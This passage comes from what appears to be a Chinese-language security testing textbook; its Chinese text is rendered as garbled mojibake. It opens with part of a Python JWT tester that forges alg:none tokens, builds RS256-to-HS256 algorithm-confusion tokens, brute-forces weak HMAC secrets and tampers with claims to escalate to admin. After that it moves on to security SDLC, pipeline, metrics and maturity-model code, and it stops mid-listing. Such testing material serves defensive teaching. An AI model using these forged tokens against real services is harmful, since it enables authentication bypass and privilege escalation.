            'severity': 'Critical',
            'description': 'Token with alg:none - test if accepted'
        })
        
        # æµ‹è¯•å…¶ä»–å˜ä½“
        variants = ['None', 'NONE', 'nOnE', ' none', 'none ']
        for variant in variants:
            header['alg'] = variant
            variant_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            variant_token = f"{variant_header}.{parts[1]}."
            
            self.test_results.append({
                'test': f'None Algorithm Variant ({variant})',
                'payload': variant_token,
                'severity': 'High'
            })
    
    def test_algorithm_confusion(self, token):
        """æµ‹è¯•ç®—æ³•æ··æ·†æ”»å‡»ï¼ˆéå¯¹ç§°åˆ°å¯¹ç§°ï¼‰"""
        # è·å–å…¬é’¥ï¼ˆå‡è®¾å¯ä»¥è·å–ï¼‰
        public_key = self.get_public_key()
        
        if public_key:
            parts = token.split('.')
            
            # ä¿®æ”¹ç®—æ³•ä¸ºHS256
            header = json.loads(self.base64_decode(parts[0]))
            header['alg'] = 'HS256'
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            # ä½¿ç”¨å…¬é’¥ä½œä¸ºå¯†é’¥ç­¾å
            message = f"{new_header}.{parts[1]}"
            
            # ä¸åŒçš„å…¬é’¥æ ¼å¼
            key_formats = [
                public_key,  # åŸå§‹å…¬é’¥
                public_key.strip(),  # å»é™¤ç©ºç™½
                public_key.replace('\n', ''),  # å»é™¤æ¢è¡Œ
                self.extract_key_content(public_key)  # åªä¿ç•™å¯†é’¥å†…å®¹
            ]
            
            for key in key_formats:
                signature = base64.urlsafe_b64encode(
                    hmac.new(
                        key.encode(),
                        message.encode(),
                        hashlib.sha256
                    ).digest()
                ).decode().rstrip('=')
                
                confused_token = f"{message}.{signature}"
                
                self.test_results.append({
                    'test': 'Algorithm Confusion (RS256->HS256)',
                    'payload': confused_token,
                    'severity': 'Critical',
                    'description': 'Using public key as HMAC secret'
                })
    
    def test_key_attacks(self, token, header):
        """æµ‹è¯•å¯†é’¥ç›¸å…³çš„æ”»å‡»"""
        
        # 1. æš´åŠ›ç ´è§£å¼±å¯†é’¥
        if header.get('alg') in ['HS256', 'HS384', 'HS512']:
            self.brute_force_weak_secrets(token)
        
        # 2. å¯†é’¥æ··æ·†æµ‹è¯•
        self.test_key_confusion(token)
        
        # 3. ç©ºå¯†é’¥æµ‹è¯•
        self.test_empty_key(token)
    
    def brute_force_weak_secrets(self, token):
        """æš´åŠ›ç ´è§£å¸¸è§çš„å¼±å¯†é’¥"""
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        original_sig = parts[2]
        
        # æ‰©å±•å¯†é’¥å­—å…¸
        extended_secrets = self.common_secrets + [
            # åŸºäºheader/payloadçš„å¯†é’¥
            self.extract_potential_secrets(parts[0], parts[1])
        ]
        
        for secret in extended_secrets:
            # å°è¯•ä¸åŒçš„ç¼–ç 
            test_secrets = [
                secret,
                secret.encode(),
                base64.b64encode(secret.encode()).decode(),
                hashlib.sha256(secret.encode()).hexdigest()
            ]
            
            for test_secret in test_secrets:
                if isinstance(test_secret, str):
                    test_secret = test_secret.encode()
                
                # è®¡ç®—ç­¾å
                calculated_sig = base64.urlsafe_b64encode(
                    hmac.new(
                        test_secret,
                        message.encode(),
                        hashlib.sha256
                    ).digest()
                ).decode().rstrip('=')
                
                if calculated_sig == original_sig:
                    self.test_results.append({
                        'test': 'Weak Secret Found',
                        'secret': test_secret.decode() if isinstance(test_secret, bytes) else test_secret,
                        'severity': 'Critical',
                        'description': 'JWT secret successfully brute-forced'
                    })
                    break
    
    def test_claim_tampering(self, original_token, payload):
        """æµ‹è¯•å£°æ˜ç¯¡æ”¹"""
        tampering_tests = []
        
        # 1. æƒé™æå‡
        if 'role' in payload:
            elevated_payload = payload.copy()
            elevated_payload['role'] = 'admin'
            tampering_tests.append(('Role Escalation', elevated_payload))
        
        if 'admin' in payload:
            elevated_payload = payload.copy()
            elevated_payload['admin'] = True
            tampering_tests.append(('Admin Flag', elevated_payload))
        
        # 2. ç”¨æˆ·IDç¯¡æ”¹
        if 'sub' in payload or 'user_id' in payload:
            id_field = 'sub' if 'sub' in payload else 'user_id'
            tampered_payload = payload.copy()
            tampered_payload[id_field] = 'admin'
            tampering_tests.append(('User ID Tampering', tampered_payload))
        
        # 3. æ—¶é—´ç¯¡æ”¹
        time_payload = payload.copy()
        time_payload['exp'] = 9999999999  # è¿œæœŸè¿‡æœŸ
        tampering_tests.append(('Expiration Extension', time_payload))
        
        # ç”Ÿæˆç¯¡æ”¹çš„token
        for test_name, tampered_payload in tampering_tests:
            self.generate_tampered_token(original_token, tampered_payload, test_name)
    
    def test_implementation_flaws(self, token):
        """æµ‹è¯•å®ç°ç¼ºé™·"""
        
        # 1. ç­¾åå‰¥ç¦»
        parts = token.split('.')
        stripped_token = f"{parts[0]}.{parts[1]}."
        
        self.test_results.append({
            'test': 'Signature Stripping',
            'payload': stripped_token,
            'severity': 'High',
            'description': 'Token with removed signature'
        })
        
        # 2. é¢å¤–æ®µæµ‹è¯•
        extra_segment_token = token + '.extra'
        
        self.test_results.append({
            'test': 'Extra Segment',
            'payload': extra_segment_token,
            'severity': 'Medium',
            'description': 'Token with additional segment'
        })
        
        # 3. ç¼–ç å˜ä½“
        self.test_encoding_variants(token)
        
        # 4. è¾¹ç•Œæ¡ä»¶
        self.test_boundary_conditions(token)
    
    def test_encoding_variants(self, token):
        """æµ‹è¯•ç¼–ç å˜ä½“"""
        parts = token.split('.')
        
        # ä¸åŒçš„Base64å˜ä½“
        variants = [
            # æ ‡å‡†Base64
            lambda x: base64.b64encode(x).decode(),
            # URLå®‰å…¨ä½†æœ‰padding
            lambda x: base64.urlsafe_b64encode(x).decode(),
            # è‡ªå®šä¹‰å­—ç¬¦è¡¨
            lambda x: x.translate(str.maketrans('+/', '-_'))
        ]
        
        for i, variant_func in enumerate(variants):
            try:
                # é‡æ–°ç¼–ç header
                header_bytes = self.base64_decode(parts[0])
                variant_header = variant_func(header_bytes).rstrip('=')
                variant_token = f"{variant_header}.{parts[1]}.{parts[2]}"
                
                self.test_results.append({
                    'test': f'Encoding Variant {i+1}',
                    'payload': variant_token,
                    'severity': 'Low',
                    'description': 'Alternative Base64 encoding'
                })
            except:
                pass
    
    def test_boundary_conditions(self, token):
        """æµ‹è¯•è¾¹ç•Œæ¡ä»¶"""
        
        # 1. è¶…é•¿payload
        parts = token.split('.')
        payload = json.loads(self.base64_decode(parts[1]))
        
        # æ·»åŠ å¤§é‡æ•°æ®
        payload['padding'] = 'A' * 10000
        
        large_payload = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        large_token = f"{parts[0]}.{large_payload}.{parts[2]}"
        
        self.test_results.append({
            'test': 'Large Payload',
            'description': 'Token with extremely large payload',
            'severity': 'Low'
        })
        
        # 2. åµŒå¥—å£°æ˜
        nested_payload = payload.copy()
        nested_payload['nested'] = {'admin': True, 'role': 'superuser'}
        
        # 3. ç‰¹æ®Šå­—ç¬¦
        special_payload = payload.copy()
        special_payload['special'] = '\x00\x01\x02'
        
    def generate_report(self):
        """ç”Ÿæˆæµ‹è¯•æŠ¥å‘Š"""
        report = {
            'summary': {
                'total_tests': len(self.test_results),
                'critical': sum(1 for t in self.test_results if t.get('severity') == 'Critical'),
                'high': sum(1 for t in self.test_results if t.get('severity') == 'High'),
                'medium': sum(1 for t in self.test_results if t.get('severity') == 'Medium'),
                'low': sum(1 for t in self.test_results if t.get('severity') == 'Low')
            },
            'vulnerabilities': self.test_results,
            'recommendations': self.generate_recommendations()
        }
        
        return report
    
    def generate_recommendations(self):
        """ç”Ÿæˆå®‰å…¨å»ºè®®"""
        recommendations = []
        
        # åŸºäºæµ‹è¯•ç»“æœç”Ÿæˆå»ºè®®
        if any(t['test'] == 'Weak Secret Found' for t in self.test_results):
            recommendations.append({
                'issue': 'Weak JWT Secret',
                'recommendation': 'ä½¿ç”¨å¼ºéšæœºå¯†é’¥ï¼ˆè‡³å°‘256ä½ï¼‰',
                'example': 'openssl rand -base64 32'
            })
        
        if any('None Algorithm' in t['test'] for t in self.test_results):
            recommendations.append({
                'issue': 'None Algorithm Vulnerability',
                'recommendation': 'æ˜ç¡®æ‹’ç»alg=noneçš„token',
                'code': 'jwt.decode(token, options={"verify_signature": True})'
            })
        
        if any('Algorithm Confusion' in t['test'] for t in self.test_results):
            recommendations.append({
                'issue': 'Algorithm Confusion',
                'recommendation': 'å¼ºåˆ¶æŒ‡å®šå…è®¸çš„ç®—æ³•',
                'code': 'jwt.decode(token, algorithms=["RS256"])'
            })
        
        return recommendations

# ä½¿ç”¨ç¤ºä¾‹
def test_jwt_security(jwt_token):
    tester = JWTSecurityTester()
    report = tester.comprehensive_jwt_test(jwt_token)
    
    print(json.dumps(report, indent=2))
    
    # ç”Ÿæˆè¯¦ç»†æŠ¥å‘Š
    generate_jwt_security_report(report)
    
    return report
```

JWTå®‰å…¨æµ‹è¯•è¦ç‚¹ï¼š
1. **ç®—æ³•æ”»å‡»**ï¼šnoneç®—æ³•ã€ç®—æ³•æ··æ·†
2. **å¯†é’¥æ”»å‡»**ï¼šå¼±å¯†é’¥æš´ç ´ã€å¯†é’¥æ··æ·†
3. **å£°æ˜ç¯¡æ”¹**ï¼šæƒé™æå‡ã€æ—¶é—´æ“çºµ
4. **å®ç°ç¼ºé™·**ï¼šç­¾åéªŒè¯ç»•è¿‡
5. **ç¼–ç é—®é¢˜**ï¼šBase64å˜ä½“ã€è¾¹ç•Œæ¡ä»¶

</details>

### è¿›ä¸€æ­¥ç ”ç©¶

1. å¦‚ä½•ä½¿ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯è‡ªåŠ¨å‘ç°æ–°çš„Webæ”»å‡»æ¨¡å¼ï¼Ÿ
2. WebAssemblyåº”ç”¨çš„å®‰å…¨æµ‹è¯•éœ€è¦å“ªäº›ç‰¹æ®Šè€ƒè™‘ï¼Ÿ
3. å¦‚ä½•è®¾è®¡é’ˆå¯¹GraphQL APIçš„å®‰å…¨æµ‹è¯•æ–¹æ³•ï¼Ÿ

## 17.5 å®‰å…¨æµ‹è¯•æœ€ä½³å®è·µ

### 17.5.1 å®‰å…¨æµ‹è¯•æµç¨‹é›†æˆ

å°†å®‰å…¨æµ‹è¯•æ— ç¼é›†æˆåˆ°å¼€å‘æµç¨‹ä¸­ï¼š

```python
class SecurityTestingLifecycle:
    def __init__(self):
        self.phases = {
            'requirements': self.security_requirements_analysis,
            'design': self.threat_modeling_and_design_review,
            'development': self.secure_coding_and_sast,
            'testing': self.security_testing_execution,
            'deployment': self.pre_deployment_validation,
            'operations': self.continuous_security_monitoring
        }
        
    def implement_sdlc_security(self):
        """å®æ–½å®‰å…¨çš„è½¯ä»¶å¼€å‘ç”Ÿå‘½å‘¨æœŸ"""
        sdlc_security = {
            'planning_phase': {
                'activities': [
                    'Security requirements gathering',
                    'Risk assessment',
                    'Compliance requirements identification',
                    'Security budget allocation'
                ],
                'deliverables': [
                    'Security requirements document',
                    'Risk register',
                    'Compliance matrix'
                ],
                'tools': ['OWASP SAMM', 'NIST frameworks']
            },
            
            'design_phase': {
                'activities': [
                    'Threat modeling sessions',
                    'Security architecture review',
                    'Secure design patterns selection',
                    'Crypto design review'
                ],
                'deliverables': [
                    'Threat model diagrams',
                    'Security architecture document',
                    'Mitigation strategies'
                ],
                'tools': ['Microsoft Threat Modeling Tool', 'OWASP Threat Dragon']
            },
            
            'implementation_phase': {
                'activities': [
                    'Secure coding training',
                    'Code review with security focus',
                    'Static analysis integration',
                    'Dependency checking'
                ],
                'deliverables': [
                    'Secure code',
                    'SAST reports',
                    'Dependency reports'
                ],
                'tools': ['SonarQube', 'Checkmarx', 'Snyk']
            },
            
            'testing_phase': {
                'activities': [
                    'Dynamic security testing',
                    'Penetration testing',
                    'Security regression testing',
                    'Compliance validation'
                ],
                'deliverables': [
                    'Security test reports',
                    'Vulnerability reports',
                    'Remediation plans'
                ],
                'tools': ['OWASP ZAP', 'Burp Suite', 'Metasploit']
            },
            
            'deployment_phase': {
                'activities': [
                    'Security configuration review',
                    'Infrastructure security validation',
                    'Security monitoring setup',
                    'Incident response preparation'
                ],
                'deliverables': [
                    'Security checklist',
                    'Monitoring dashboards',
                    'Incident response plan'
                ],
                'tools': ['AWS Security Hub', 'Azure Security Center']
            },
            
            'maintenance_phase': {
                'activities': [
                    'Security patch management',
                    'Continuous vulnerability scanning',
                    'Security metrics tracking',
                    'Regular security assessments'
                ],
                'deliverables': [
                    'Patch reports',
                    'Security metrics dashboard',
                    'Improvement recommendations'
                ],
                'tools': ['Qualys', 'Tenable', 'Rapid7']
            }
        }
        
        return sdlc_security
```

### 17.5.2 å®‰å…¨æµ‹è¯•è‡ªåŠ¨åŒ–

æ„å»ºè‡ªåŠ¨åŒ–çš„å®‰å…¨æµ‹è¯•ç®¡é“ï¼š

```python
class SecurityTestAutomation:
    def __init__(self):
        self.pipeline_stages = []
        self.security_gates = []
        self.tools_integration = {}
        
    def build_security_pipeline(self):
        """æ„å»ºè‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•æµæ°´çº¿"""
        return {
            'commit_stage': {
                'triggers': ['pre-commit', 'commit'],
                'checks': [
                    'Secret scanning',
                    'Sensitive data detection',
                    'Basic SAST checks'
                ],
                'tools': {
                    'gitleaks': 'detect-secrets',
                    'trufflehog': 'secret-scanning',
                    'semgrep': 'pattern-matching'
                },
                'failure_action': 'block_commit'
            },
            
            'build_stage': {
                'triggers': ['build', 'pull_request'],
                'checks': [
                    'Dependency vulnerability scanning',
                    'Container security scanning',
                    'Full SAST analysis',
                    'License compliance'
                ],
                'parallel_execution': True,
                'timeout': '30m'
            },
            
            'test_stage': {
                'triggers': ['post_build'],
                'checks': [
                    'DAST scanning',
                    'API security testing',
                    'Fuzzing',
                    'Security unit tests'
                ],
                'environments': ['staging', 'security-test']
            },
            
            'release_stage': {
                'triggers': ['pre_release'],
                'checks': [
                    'Final security scan',
                    'Configuration validation',
                    'Compliance verification',
                    'Security sign-off'
                ],
                'approval_required': True
            }
        }
    
    def create_security_test_suite(self):
        """åˆ›å»ºè‡ªåŠ¨åŒ–å®‰å…¨æµ‹è¯•å¥—ä»¶"""
        test_suite = SecurityTestSuite()
        
        # åŸºç¡€è®¾æ–½æµ‹è¯•
        test_suite.add_tests([
            NetworkSecurityTests(),
            CloudConfigurationTests(),
            ContainerSecurityTests(),
            KubernetesSecurityTests()
        ])
        
        # åº”ç”¨å®‰å…¨æµ‹è¯•
        test_suite.add_tests([
            AuthenticationTests(),
            AuthorizationTests(),
            InputValidationTests(),
            SessionManagementTests(),
            CryptographyTests()
        ])
        
        # åˆè§„æ€§æµ‹è¯•
        test_suite.add_tests([
            GDPRComplianceTests(),
            PCIDSSComplianceTests(),
            HIPAAComplianceTests(),
            SOC2ComplianceTests()
        ])
        
        return test_suite
```

### 17.5.3 å®‰å…¨æµ‹è¯•åº¦é‡

å»ºç«‹å®‰å…¨æµ‹è¯•çš„åº¦é‡ä½“ç³»ï¼š

```python
class SecurityMetrics:
    def __init__(self):
        self.metrics = {
            'vulnerability_metrics': self.calculate_vulnerability_metrics,
            'coverage_metrics': self.calculate_coverage_metrics,
            'process_metrics': self.calculate_process_metrics,
            'risk_metrics': self.calculate_risk_metrics
        }
        
    def calculate_vulnerability_metrics(self, data):
        """è®¡ç®—æ¼æ´ç›¸å…³æŒ‡æ ‡"""
        return {
            'vulnerability_density': len(data['vulnerabilities']) / data['kloc'],
            'critical_vulnerability_count': sum(1 for v in data['vulnerabilities'] 
                                              if v['severity'] == 'critical'),
            'mean_time_to_detect': self.calculate_mttd(data),
            'mean_time_to_remediate': self.calculate_mttr(data),
            'vulnerability_aging': self.calculate_aging(data),
            'false_positive_rate': data['false_positives'] / data['total_findings'],
            'vulnerability_recurrence_rate': self.calculate_recurrence(data)
        }
    
    def calculate_coverage_metrics(self, data):
        """è®¡ç®—æµ‹è¯•è¦†ç›–ç‡æŒ‡æ ‡"""
        return {
            'security_test_coverage': {
                'authentication': data['auth_tests'] / data['total_auth_functions'],
                'authorization': data['authz_tests'] / data['total_authz_points'],
                'input_validation': data['input_tests'] / data['total_inputs'],
                'crypto': data['crypto_tests'] / data['total_crypto_ops']
            },
            'attack_surface_coverage': self.calculate_attack_surface_coverage(data),
            'security_requirements_coverage': data['tested_requirements'] / data['total_requirements'],
            'threat_model_coverage': data['tested_threats'] / data['identified_threats']
        }
    
    def generate_security_dashboard(self):
        """ç”Ÿæˆå®‰å…¨ä»ªè¡¨æ¿"""
        dashboard = {
            'executive_view': {
                'security_score': self.calculate_security_score(),
                'risk_level': self.assess_risk_level(),
                'compliance_status': self.check_compliance_status(),
                'trend_analysis': self.analyze_trends()
            },
            
            'operational_view': {
                'open_vulnerabilities': self.get_open_vulnerabilities(),
                'patch_status': self.get_patch_status(),
                'security_test_results': self.get_latest_test_results(),
                'security_incidents': self.get_recent_incidents()
            },
            
            'technical_view': {
                'vulnerability_breakdown': self.get_vulnerability_breakdown(),
                'code_quality_metrics': self.get_code_quality_metrics(),
                'security_debt': self.calculate_security_debt(),
                'automation_coverage': self.get_automation_coverage()
            }
        }
        
        return dashboard
```

### 17.5.4 å®‰å…¨æ–‡åŒ–å»ºè®¾

åŸ¹å…»å®‰å…¨æ„è¯†å’Œæ–‡åŒ–ï¼š

```python
class SecurityCultureBuilder:
    def __init__(self):
        self.programs = {
            'training': self.security_training_program,
            'awareness': self.security_awareness_campaign,
            'champions': self.security_champions_program,
            'gamification': self.security_gamification
        }
        
    def implement_security_training(self):
        """å®æ–½å®‰å…¨åŸ¹è®­è®¡åˆ’"""
        training_curriculum = {
            'developer_track': [
                {
                    'course': 'Secure Coding Fundamentals',
                    'duration': '2 days',
                    'topics': [
                        'OWASP Top 10',
                        'Secure coding practices',
                        'Common vulnerabilities',
                        'Security tools usage'
                    ],
                    'hands_on_labs': True
                },
                {
                    'course': 'Advanced Application Security',
                    'duration': '3 days',
                    'topics': [
                        'Threat modeling',
                        'Cryptography basics',
                        'Security architecture',
                        'Security testing'
                    ]
                }
            ],
            
            'tester_track': [
                {
                    'course': 'Security Testing Fundamentals',
                    'duration': '3 days',
                    'topics': [
                        'Security testing methodology',
                        'Tool usage (Burp, ZAP, etc.)',
                        'Vulnerability identification',
                        'Report writing'
                    ]
                },
                {
                    'course': 'Ethical Hacking and Penetration Testing',
                    'duration': '5 days',
                    'topics': [
                        'Reconnaissance',
                        'Scanning and enumeration',
                        'Exploitation',
                        'Post-exploitation'
                    ],
                    'certification': 'CEH'
                }
            ],
            
            'management_track': [
                {
                    'course': 'Security Risk Management',
                    'duration': '1 day',
                    'topics': [
                        'Risk assessment',
                        'Security metrics',
                        'Compliance requirements',
                        'Incident response'
                    ]
                }
            ]
        }
        
        return training_curriculum
    
    def create_security_champions_program(self):
        """åˆ›å»ºå®‰å…¨å€¡å¯¼è€…è®¡åˆ’"""
        return {
            'selection_criteria': [
                'Interest in security',
                'Technical competence',
                'Leadership qualities',
                'Communication skills'
            ],
            
            'responsibilities': [
                'Security point of contact for team',
                'Conduct security reviews',
                'Promote secure practices',
                'Bridge between security and development teams'
            ],
            
            'support_structure': {
                'monthly_meetings': 'Security champions meetup',
                'dedicated_slack_channel': '#security-champions',
                'training_budget': '$2000/year per champion',
                'recognition_program': 'Security Champion of the Quarter'
            },
            
            'activities': [
                'Lunch and learn sessions',
                'Security bug hunts',
                'Capture the flag events',
                'Security conference attendance'
            ]
        }
```

### ç»ƒä¹  17.5

1. **è®¾è®¡é¢˜**ï¼šè®¾è®¡ä¸€ä¸ªå®‰å…¨æµ‹è¯•æˆç†Ÿåº¦æ¨¡å‹ã€‚

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

å®‰å…¨æµ‹è¯•æˆç†Ÿåº¦æ¨¡å‹è®¾è®¡ï¼š

```python
class SecurityTestingMaturityModel:
    def __init__(self):
        self.maturity_levels = {
            1: 'Initial',
            2: 'Developing',
            3: 'Defined',
            4: 'Managed',
            5: 'Optimized'
        }
        
        self.dimensions = [
            'governance',
            'design',
            'implementation',
            'verification',
            'operations'
        ]
    
    def define_maturity_levels(self):
        """å®šä¹‰å„æˆç†Ÿåº¦çº§åˆ«çš„ç‰¹å¾"""
        return {
            'Level_1_Initial': {
                'characteristics': [
                    'Ad-hoc security testing',
                    'No formal processes',
                    'Reactive approach',
                    'Limited security awareness'
                ],
                'practices': {
                    'governance': [
                        'No dedicated security roles',
                        'No security policies',
                        'Compliance driven only'
                    ],
                    'design': [
                        'No threat modeling',
                        'Security as afterthought',
                        'No secure design standards'
                    ],
                    'implementation': [
                        'No secure coding standards',
                        'Manual code reviews if any',
                        'No security tools'
                    ],
                    'verification': [
                        'Only external pen tests',
                        'No regular testing',
                        'No vulnerability management'
                    ],
                    'operations': [
                        'No security monitoring',
                        'No incident response plan',
                        'No security metrics'
                    ]
                }
            },
            
            'Level_2_Developing': {
                'characteristics': [
                    'Basic security practices emerging',
                    'Some automation',
                    'Security awareness growing',
                    'Inconsistent application'
                ],
                'practices': {
                    'governance': [
                        'Security roles defined',
                        'Basic policies in place',
                        'Initial risk assessment'
                    ],
                    'design': [
                        'Ad-hoc threat modeling',
                        'Some security requirements',
                        'Basic secure design principles'
                    ],
                    'implementation': [
                        'Basic SAST tools',
                        'Some secure coding training',
                        'Dependency checking'
                    ],
                    'verification': [
                        'Regular vulnerability scans',
                        'Basic security testing',
                        'Manual penetration tests'
                    ],
                    'operations': [
                        'Basic monitoring',
                        'Incident response procedures',
                        'Some metrics collection'
                    ]
                }
            },
            
            'Level_3_Defined': {
                'characteristics': [
                    'Standardized security processes',
                    'Consistent tool usage',
                    'Proactive security approach',
                    'Integrated into SDLC'
                ],
                'practices': {
                    'governance': [
                        'Security team established',
                        'Comprehensive policies',
                        'Regular risk assessments',
                        'Security training program'
                    ],
                    'design': [
                        'Mandatory threat modeling',
                        'Security architecture reviews',
                        'Secure design patterns',
                        'Security requirements baseline'
                    ],
                    'implementation': [
                        'Automated SAST in CI/CD',
                        'Secure coding standards enforced',
                        'Regular security code reviews',
                        'Component analysis'
                    ],
                    'verification': [
                        'Automated security testing',
                        'Regular penetration testing',
                        'DAST implementation',
                        'Vulnerability management process'
                    ],
                    'operations': [
                        'Continuous monitoring',
                        'Incident response team',
                        'Security metrics dashboard',
                        'Regular security assessments'
                    ]
                }
            },
            
            'Level_4_Managed': {
                'characteristics': [
                    'Quantitative management',
                    'Continuous improvement',
                    'Risk-based approach',
                    'Predictive capabilities'
                ],
                'practices': {
                    'governance': [
                        'Risk-based security strategy',
                        'Metrics-driven decisions',
                        'Security embedded in culture',
                        'Continuous compliance'
                    ],
                    'design': [
                        'Threat modeling automation',
                        'Security patterns library',
                        'Privacy by design',
                        'Abuse case modeling'
                    ],
                    'implementation': [
                        'Advanced SAST/DAST integration',
                        'Security champions program',
                        'Automated remediation',
                        'Supply chain security'
                    ],
                    'verification': [
                        'Continuous security testing',
                        'Red team exercises',
                        'Chaos engineering for security',
                        'ML-based vulnerability prediction'
                    ],
                    'operations': [
                        'Advanced threat detection',
                        'Automated incident response',
                        'Predictive analytics',
                        'Security orchestration'
                    ]
                }
            },
            
            'Level_5_Optimized': {
                'characteristics': [
                    'Innovation in security',
                    'Industry leadership',
                    'Predictive and adaptive',
                    'Security as enabler'
                ],
                'practices': {
                    'governance': [
                        'Security innovation lab',
                        'Industry collaboration',
                        'Thought leadership',
                        'Zero trust architecture'
                    ],
                    'design': [
                        'AI-driven threat modeling',
                        'Quantum-safe cryptography',
                        'Advanced privacy tech',
                        'Security by default'
                    ],
                    'implementation': [
                        'AI-powered code analysis',
                        'Automated security fixes',
                        'DevSecOps excellence',
                        'Security as code'
                    ],
                    'verification': [
                        'AI-driven testing',
                        'Continuous red teaming',
                        'Advanced fuzzing',
                        'Predictive vulnerability discovery'
                    ],
                    'operations': [
                        'AI-powered SOC',
                        'Predictive threat intelligence',
                        'Automated healing',
                        'Continuous security posture optimization'
                    ]
                }
            }
        }
    
    def assess_maturity(self, organization):
        """è¯„ä¼°ç»„ç»‡çš„å®‰å…¨æµ‹è¯•æˆç†Ÿåº¦"""
        assessment = SecurityMaturityAssessment()
        
        scores = {}
        for dimension in self.dimensions:
            score = assessment.evaluate_dimension(organization, dimension)
            scores[dimension] = score
        
        overall_maturity = self.calculate_overall_maturity(scores)
        
        return {
            'current_level': overall_maturity,
            'dimension_scores': scores,
            'strengths': self.identify_strengths(scores),
            'gaps': self.identify_gaps(scores),
            'recommendations': self.generate_roadmap(scores)
        }
    
    def generate_roadmap(self, current_scores):
        """ç”Ÿæˆæˆç†Ÿåº¦æå‡è·¯çº¿å›¾"""
        roadmap = {
            'short_term_3_months': [],
            'medium_term_6_months': [],
            'long_term_12_months': []
        }
        
        for dimension, score in current_scores.items():
            if score < 2:
                # ä¼˜å…ˆæå‡åˆ°Level 2
                roadmap['short_term_3_months'].extend(
                    self.get_improvement_actions(dimension, score, 2)
                )
            elif score < 3:
                # æå‡åˆ°Level 3
                roadmap['medium_term_6_months'].extend(
                    self.get_improvement_actions(dimension, score, 3)
                )
            else:
                # è¿½æ±‚æ›´é«˜çº§åˆ«
                roadmap['long_term_12_months'].extend(
                    self.get_improvement_actions(dimension, score, score + 1)
                )
        
        return roadmap
    
    def create_assessment_questionnaire(self):
        """åˆ›å»ºæˆç†Ÿåº¦è¯„ä¼°é—®å·"""
        questionnaire = {
            'governance': [
                {
                    'question': 'Do you have a dedicated security team?',
                    'weight': 0.2,
                    'level_indicators': {
                        'No team': 1,
                        'Part-time resources': 2,
                        'Dedicated team': 3,
                        'Mature team with specializations': 4,
                        'Center of Excellence': 5
                    }
                },
                # æ›´å¤šé—®é¢˜...
            ],
            'design': [
                {
                    'question': 'How is threat modeling performed?',
                    'weight': 0.25,
                    'level_indicators': {
                        'Not performed': 1,
                        'Ad-hoc for critical apps': 2,
                        'Standard process for all apps': 3,
                        'Automated and continuous': 4,
                        'AI-enhanced predictive': 5
                    }
                },
                # æ›´å¤šé—®é¢˜...
            ]
            # å…¶ä»–ç»´åº¦...
        }
        
        return questionnaire
    
    def benchmark_against_industry(self, assessment_results):
        """è¡Œä¸šåŸºå‡†å¯¹æ¯”"""
        industry_benchmarks = {
            'financial_services': {
                'average_maturity': 3.5,
                'governance': 4.0,
                'design': 3.5,
                'implementation': 3.5,
                'verification': 3.2,
                'operations': 3.3
            },
            'healthcare': {
                'average_maturity': 2.8,
                'governance': 3.2,
                'design': 2.5,
                'implementation': 2.7,
                'verification': 2.8,
                'operations': 2.9
            },
            'technology': {
                'average_maturity': 3.8,
                'governance': 3.5,
                'design': 4.0,
                'implementation': 4.2,
                'verification': 3.8,
                'operations': 3.5
            }
        }
        
        return self.compare_with_benchmark(assessment_results, industry_benchmarks)

# ä½¿ç”¨ç¤ºä¾‹
def assess_security_maturity(organization):
    model = SecurityTestingMaturityModel()
    
    # æ‰§è¡Œè¯„ä¼°
    assessment = model.assess_maturity(organization)
    
    # ç”ŸæˆæŠ¥å‘Š
    report = {
        'executive_summary': generate_executive_summary(assessment),
        'detailed_findings': assessment,
        'improvement_roadmap': model.generate_roadmap(assessment['dimension_scores']),
        'investment_requirements': estimate_investment(assessment),
        'expected_roi': calculate_security_roi(assessment)
    }
    
    # å¯è§†åŒ–
    create_maturity_radar_chart(assessment['dimension_scores'])
    create_roadmap_gantt_chart(report['improvement_roadmap'])
    
    return report
```

è¿™ä¸ªæˆç†Ÿåº¦æ¨¡å‹åŒ…å«ï¼š
1. 5ä¸ªæˆç†Ÿåº¦çº§åˆ«
2. 5ä¸ªè¯„ä¼°ç»´åº¦
3. è¯¦ç»†çš„å®è·µæŒ‡æ ‡
4. è¯„ä¼°æ–¹æ³•å’Œå·¥å…·
5. æ”¹è¿›è·¯çº¿å›¾ç”Ÿæˆ
6. è¡Œä¸šåŸºå‡†å¯¹æ¯”

</details>

2. **å®è·µé¢˜**ï¼šå¦‚ä½•å»ºç«‹å®‰å…¨æµ‹è¯•çš„æŒç»­æ”¹è¿›æœºåˆ¶ï¼Ÿ

<details>
<summary>å‚è€ƒç­”æ¡ˆ</summary>

å»ºç«‹å®‰å…¨æµ‹è¯•æŒç»­æ”¹è¿›æœºåˆ¶ï¼š

```python
class SecurityTestingContinuousImprovement:
    def __init__(self):
        self.improvement_cycle = {
            'measure': self.measure_current_state,
            'analyze': self.analyze_gaps,
            'improve': self.implement_improvements,
            'control': self.monitor_and_control
        }
        
    def establish_improvement_framework(self):
        """å»ºç«‹æŒç»­æ”¹è¿›æ¡†æ¶"""
        return {
            'governance_structure': {
                'security_steering_committee': {
                    'members': ['CISO', 'CTO', 'Head of Engineering', 'Head of QA'],
                    'meeting_frequency': 'Monthly',
                    'responsibilities': [
                        'Set security objectives',
                        'Review metrics and progress',
                        'Approve improvement initiatives',
                        'Allocate resources'
                    ]
                },
                
                'security_working_group': {
                    'members': ['Security engineers', 'Developers', 'Testers'],
                    'meeting_frequency': 'Bi-weekly',
                    'responsibilities': [
                        'Identify improvement opportunities',
                        'Implement improvements',
                        'Share best practices',
                        'Conduct retrospectives'
                    ]
                }
            },
            
            'measurement_system': {
                'kpis': [
                    'Vulnerability detection rate',
                    'Mean time to remediation',
                    'Security test coverage',
                    'False positive rate',
                    'Security debt ratio',
                    'Tool effectiveness'
                ],
                
                'data_sources': [
                    'Security scanning tools',
                    'Bug tracking systems',
                    'CI/CD pipelines',
                    'Security incident reports',
                    'Code repositories'
                ],
                
                'reporting_frequency': {
                    'real_time_dashboards': ['vulnerability_count', 'test_status'],
                    'weekly_reports': ['new_vulnerabilities', 'remediation_progress'],
                    'monthly_reports': ['trend_analysis', 'team_performance'],
